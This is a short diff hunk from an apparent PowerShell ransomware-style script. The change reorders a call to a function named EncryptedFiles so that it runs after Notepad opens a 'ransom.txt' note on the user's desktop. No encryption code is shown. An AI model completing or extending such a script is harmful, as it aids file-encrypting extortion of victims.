@@ -92,5 +92,6 @@ function EncryptedFiles
     explorer z:
 } 
 
-EncryptedFiles
 notepad c:/users/$env:USERNAME/desktop/ransom.txt
+EncryptedFiles
+
